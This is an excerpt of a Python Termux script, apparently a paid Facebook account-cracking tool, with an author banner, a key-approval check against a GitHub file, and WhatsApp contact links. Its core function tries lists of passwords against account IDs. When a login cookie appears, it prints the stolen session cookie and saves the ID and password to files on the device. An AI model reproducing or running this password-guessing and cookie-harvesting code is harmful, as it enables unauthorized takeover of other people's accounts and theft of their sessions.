#AUTHOR: AZAD MAHMUD
#WhatsApp : 01616035819
#Github : AZADmahmudkcht
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/azadmahmudkcht/GREEN/blob/main/GREEN.txt').text
...
\033[1;33m╔═══════════════════════════════════════════════╗
║\033[1;32m🌺WELLCOME TO AZAD TERMUX COMMAND WORLD 2.0🌺\033[1;33m║
╚═══════════════════════════════════════════════╝                                             
\033[32;1m╔═══════════════════════════════════════════════╗
\033[32;1m║ ╔═══════════════════════════════════════════╗ ║
\033[32;1m║ ║\033[91;1m❤︎[❥] 𝐓𝐎𝐎𝐋S    : \033[31;1m\033[36;1m BD RANDOM                 \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
\033[32;1m║ ║\033[32;1m❤︎[❥] 𝐀𝐔𝐓𝐇𝐎𝐑   : \033[32;1m\033[34;1m AZAD                      \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
\033[32;1m║ ║\033[34;1m❤︎[❥] G𝐈𝐓𝐇𝐔𝐁   : \033[33;1m\033[33;1m AZADmahmudkcht   \033[34;1m         \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
\033[32;1m║ ║\033[33;1m❤︎[❥] W𝐇𝐀𝐓S𝐀PP : \033[32;1m\033[37;1m 016*******9               \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
\033[32;1m║ ║\033[37;1m❤︎[❥] F𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : \033[34;1m\033[35;1m AZAD MAHMUD   \033[35;1m            \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
...
\033[32;1m╚═══════════════════════════════════════════════╝""")
  play_music('12.mp3')   
  print(f"\t \033[1;32m  ADMIN BY AZAD \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Best Paid Tools Of AZAD MAHMUD   \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Whatsapps Number +8801616035819\033[1;37m ")
  print(f"")
  ...
  os.system(f'xdg-open https://www.facebook.com/Azad.Your.DaD')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/azadmahmudkcht/GREEN/blob/main/GREEN.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801616035819?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801616035819');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/Azad.Your.DaD');time.sleep(1)
		admin()
	if bal =='3':
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mAZAD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [AZAD-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                open('/sdcard/AZAD-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/AZAD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [💮] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/AZAD-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
